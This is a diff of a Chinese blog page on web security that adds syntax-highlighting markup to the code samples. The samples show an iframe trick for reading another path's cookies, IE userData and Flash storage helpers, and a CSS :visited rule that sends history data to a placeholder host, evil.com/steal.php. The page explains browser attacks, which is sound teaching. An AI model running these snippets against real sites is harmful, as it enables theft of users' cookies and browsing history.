@@ -4,6 +4,10 @@
     <meta charset="UTF-8">
     <link rel="icon" href="/static/favicon.ico" type="image/x-icon"/>
     <link rel="stylesheet" href="/static/css/all.css" />
+    <!---hljs的css-->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/bootstrap/3.2.0/css/bootstrap.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/highlight.js/9.1.0/styles/github.min.css">
+
     <title>大脸圆玉的博客</title>
 </head>
 <body>
@@ -101,16 +105,16 @@ Access-Control-Allow-Origin 就不能设置为*通配符</p>
 <h3 id="跨路径读取cookie">跨路径读取Cookie</h3>
 <p>那么有什么办法跨路径读取Cookie？比如，/evil/路径想读取/admin/路径的Cookie。很简单，通过跨iframe 进行
 DOM 操作即可，/evil/路径下页面的代码如下：</p>
-<pre><code class="language-javascript">xc = function(src){
-var o = document.createElement(&quot;iframe&quot;); // iframe 进入同域的目标页面
+<pre><code class="language-javascript">xc = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">src</span>)</span>{
+<span class="hljs-keyword">var</span> o = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">"iframe"</span>); <span class="hljs-comment">// iframe 进入同域的目标页面</span>
 o.src = src;
-document.getElementsByTagName(&quot;body&quot;)[0].appendChild(o);
-o.onload = function(){ // iframe 加载完成后
+<span class="hljs-built_in">document</span>.getElementsByTagName(<span class="hljs-string">"body"</span>)[<span class="hljs-number">0</span>].appendChild(o);
+o.onload = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>{ <span class="hljs-comment">// iframe 加载完成后</span>
 d = o.contentDocument || o.contentWindow.document;
-// 获取document 对象
-alert(d.cookie); // 获取cookie
+<span class="hljs-comment">// 获取document 对象</span>
+alert(d.cookie); <span class="hljs-comment">// 获取cookie</span>
 };
-}(&#39;http://a.foo.com/admin/index.php&#39;);</code></pre>
+}(<span class="hljs-string">'http://a.foo.com/admin/index.php'</span>);</code></pre>
 <p>所以，通过设置path 不能防止重要的Cookie 被盗取。</p>
 <h3 id="本地cookie-与内存cookie">本地Cookie 与内存Cookie</h3>
 <p>如果没设置过期时间，就是内存Cookie，这样的Cookie 会随着浏览器的关闭而从内存中消失；如果设置了
@@ -131,55 +135,55 @@ alert(d.cookie); // 获取cookie
  是本地Cookie，则这个本地Cookie 必须拥有P3P 属性，否则，即使目标域响应了P3P 头
  也没用。</p>
 <h3 id="ie的userdata">IE的userData</h3>
-<pre><code class="language-javascript">function set_ud(key,value) {
- var a = document.getElementById(&#39;x&#39;); // x 为任意div 的id 值
- a.addBehavior(&quot;#default#userdata&quot;);
- a.setAttribute(key,value);
- a.save(&quot;db&quot;);
+<pre><code class="language-javascript"><span class="hljs-keyword">function</span> set<span class="hljs-constructor">_ud(<span class="hljs-params">key</span>,<span class="hljs-params">value</span>)</span> {
+ var a = document.get<span class="hljs-constructor">ElementById('<span class="hljs-params">x</span>')</span>; <span class="hljs-comment">// x 为任意div 的id 值</span>
+ a.add<span class="hljs-constructor">Behavior(<span class="hljs-string">"#default#userdata"</span>)</span>;
+ a.set<span class="hljs-constructor">Attribute(<span class="hljs-params">key</span>,<span class="hljs-params">value</span>)</span>;
+ a.save(<span class="hljs-string">"db"</span>);
 }
-function get_ud(key) {
- var a = document.getElementById(&#39;x&#39;);
- a.addBehavior(&quot;#default#userdata&quot;);
- a.load(&quot;db&quot;);
- alert(a.getAttribute(key));
+<span class="hljs-keyword">function</span> get<span class="hljs-constructor">_ud(<span class="hljs-params">key</span>)</span> {
+ var a = document.get<span class="hljs-constructor">ElementById('<span class="hljs-params">x</span>')</span>;
+ a.add<span class="hljs-constructor">Behavior(<span class="hljs-string">"#default#userdata"</span>)</span>;
+ a.load(<span class="hljs-string">"db"</span>);
+ alert(a.get<span class="hljs-constructor">Attribute(<span class="hljs-params">key</span>)</span>);
 }
-function del_ud(key) {
- var a = document.getElementById(&#39;x&#39;);
- a.addBehavior(&quot;#default#userdata&quot;);
- a.setAttribute(key, &quot;&quot;); // 设置为空值即可
- a.save(&quot;db&quot;);
+<span class="hljs-keyword">function</span> del<span class="hljs-constructor">_ud(<span class="hljs-params">key</span>)</span> {
+ var a = document.get<span class="hljs-constructor">ElementById('<span class="hljs-params">x</span>')</span>;
+ a.add<span class="hljs-constructor">Behavior(<span class="hljs-string">"#default#userdata"</span>)</span>;
+ a.set<span class="hljs-constructor">Attribute(<span class="hljs-params">key</span>, <span class="hljs-string">""</span>)</span>; <span class="hljs-comment">// 设置为空值即可</span>
+ a.save(<span class="hljs-string">"db"</span>);
 }
-window.onload = function(){
- set_ud(&#39;a&#39;,&#39;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#39;); // 设置
- get_ud(&#39;a&#39;); // 获取a 的值
- del_ud(&#39;a&#39;); // 删除a 的值
- get_ud(&#39;a&#39;); // 获取a 的值
+window.onload = <span class="hljs-keyword">function</span><span class="hljs-literal">()</span>{
+ set<span class="hljs-constructor">_ud('<span class="hljs-params">a</span>','<span class="hljs-params">xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span>')</span>; <span class="hljs-comment">// 设置</span>
+ get<span class="hljs-constructor">_ud('<span class="hljs-params">a</span>')</span>; <span class="hljs-comment">// 获取a 的值</span>
+ del<span class="hljs-constructor">_ud('<span class="hljs-params">a</span>')</span>; <span class="hljs-comment">// 删除a 的值</span>
+ get<span class="hljs-constructor">_ud('<span class="hljs-params">a</span>')</span>; <span class="hljs-comment">// 获取a 的值</span>
 };</code></pre>
 <h3 id="flashcookie">FlashCookie</h3>
-<pre><code class="language-actionScript">function set_lso(k:String=&quot;default&quot;, v:String=&quot;&quot;):void
-{ // 设置值
- var shared:SharedObject = SharedObject.getLocal(&quot;db&quot;);
- shared.data[k] = v;
- shared.flush();
+<pre><code class="language-actionScript"><span class="hljs-keyword">function</span> set<span class="hljs-constructor">_lso(<span class="hljs-params">k</span>:String=<span class="hljs-string">"default"</span>, <span class="hljs-params">v</span>:String=<span class="hljs-string">""</span>)</span>:void
+{ <span class="hljs-comment">// 设置值</span>
+ var shared:SharedObject = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SharedObject</span>.</span></span>get<span class="hljs-constructor">Local(<span class="hljs-string">"db"</span>)</span>;
+ shared.data<span class="hljs-literal">[<span class="hljs-identifier">k</span>]</span> = v;
+ shared.flush<span class="hljs-literal">()</span>;
 }
-function get_lso(k:String=&quot;default&quot;):String
-{ // 获取值
- var str:String = &quot;&quot;;
- var shared:SharedObject = SharedObject.getLocal(&quot;db&quot;);
- str = shared.data[k];
+<span class="hljs-keyword">function</span> get<span class="hljs-constructor">_lso(<span class="hljs-params">k</span>:String=<span class="hljs-string">"default"</span>)</span>:String
+{ <span class="hljs-comment">// 获取值</span>
+ var str:String = <span class="hljs-string">""</span>;
+ var shared:SharedObject = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SharedObject</span>.</span></span>get<span class="hljs-constructor">Local(<span class="hljs-string">"db"</span>)</span>;
+ str = shared.data<span class="hljs-literal">[<span class="hljs-identifier">k</span>]</span>;
  return str;
 }
-function clear_lso():void
-{ // 清空值
- var shared:SharedObject = SharedObject.getLocal(&quot;db&quot;);
- shared.clear();
+<span class="hljs-keyword">function</span> clear<span class="hljs-constructor">_lso()</span>:void
+{ <span class="hljs-comment">// 清空值</span>
+ var shared:SharedObject = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SharedObject</span>.</span></span>get<span class="hljs-constructor">Local(<span class="hljs-string">"db"</span>)</span>;
+ shared.clear<span class="hljs-literal">()</span>;
 }</code></pre>
 </li>
 </ol>
 <h3 id="函数劫持很简单">函数劫持很简单</h3>
 <p>一般情况下，只要在目标函数触发之前，重写这个函数即可</p>
 <h3 id="css">css</h3>
-<pre><code class="language-css">#a2:visited {background: url(http://www.evil.com/css/steal.php?data=a2);}</code></pre>
+<pre><code class="language-css"><span class="hljs-selector-id">#a2</span><span class="hljs-selector-pseudo">:visited</span> {<span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(http://www.evil.com/css/steal.php?data=a2);}</code></pre>
 
         </div>
     </div>
@@ -189,5 +193,8 @@ function clear_lso():void
     //文章里面的外链都打开新窗口    
     var alist = document.querySelectorAll(".article a");
     for(let i=0;i<alist.length;i++) if(alist[i].href.indexOf('#') < 0) alist[i].target="_blank"    
+    //加上table样式
+    var tableList = document.querySelectorAll("table");
+    for(let i = 0;i<tableList.length;i++) tableList[i].className+=" table table-striped"
 </script>
 </html>
